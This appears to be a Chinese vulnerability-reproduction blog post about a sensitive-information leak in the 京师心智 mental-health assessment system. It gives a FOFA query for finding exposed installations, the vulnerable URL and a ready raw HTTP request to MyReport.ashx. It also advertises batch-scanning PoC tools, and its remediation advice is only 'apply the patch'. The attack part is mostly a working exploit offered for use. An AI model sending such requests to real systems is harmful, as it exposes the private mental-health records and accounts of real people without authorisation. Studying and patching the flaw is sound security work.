#  京师心智心理健康测评系统MyReport.ashx存在敏感信息泄露 附POC软件   
 南风漏洞复现文库   2024-03-20 21:12  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 京师心智心理健康测评系统简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
京师心智心理健康测评系统  
## 2.漏洞描述  
  
京师心智心理健康测评系统MyReport.ashx存在敏感信息泄露  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
京师心智心理健康测评系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YxtuicqUetBuEeia9f8JJoL1RtzDGZgZtO0Tu8Ox8TxVvGnwxaP3fxknZZ94CFr86xJ9UVaMQyexdw/640?wx_fmt=jpeg&from=appmsg "null")  
  
京师心智心理健康测评系统MyReport.ashx存在敏感信息泄露  
## 4.fofa查询语句  
  
body="JS/ligerComboBox/ligerTree.js"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/FunctionModular/PersonalReport/Ajax/MyReport.ashx?type=3&loginName=admin  
  
漏洞数据包：  
```
GET /FunctionModular/PersonalReport/Ajax/MyReport.ashx?type=3&loginName=admin HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YxtuicqUetBuEeia9f8JJoL1lTuGIhOje2SGsBj0xlaLZ9SSpJwkh9TvOFUWUM7VbM7YOVIoMBd4Jw/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YxtuicqUetBuEeia9f8JJoL1kx6kKPazgRzRicYnCe3JRoO5CQPudcjFGIqDDmaKy9RBUhZFVBW8h8w/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YxtuicqUetBuEeia9f8JJoL1mxlBOTwxrR7eBxcRvrMUicazHNuXbxGLoc54LKjTfdnqUYnDBhbTNaA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YxtuicqUetBuEeia9f8JJoL1eibLPpghticzmyDp6YicM63ibL59GCIZM8LuugnAHjcLLFJqG5OhOkjBdw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YxtuicqUetBuEeia9f8JJoL1tVSNcQFENLiaT1LEibFuEmRrKlNDOZZZZmMhia4f5drjiaOdQFcWQYibXYg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YxtuicqUetBuEeia9f8JJoL19u3XIKV6S8YQlFrADHvoOOicQlOaGZu01n6KiasqPhQSjXmia1zHZHFwA/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
[大华智慧园区综合管理平台clientServer存在SQL注入漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485829&idx=1&sn=16d23e7e11cc7cff1fbfd11f000a80f3&chksm=974b8482a03c0d94799dd4a06ef8ad5484b129844b8e68b2db2a538bdc0cb1c44bbc8e893659&scene=21#wechat_redirect)  
  
  
[泛微e-cology getE9DevelopAllNameValue2接口存在任意文件读取漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485795&idx=1&sn=15af77d340517e0f3d61519153b46e26&chksm=974b8464a03c0d721027afbca07d05e066d9f9c2e4be1d4f9a2a779fbfcbe7c3e6921db37c71&scene=21#wechat_redirect)  
  
  
  
  
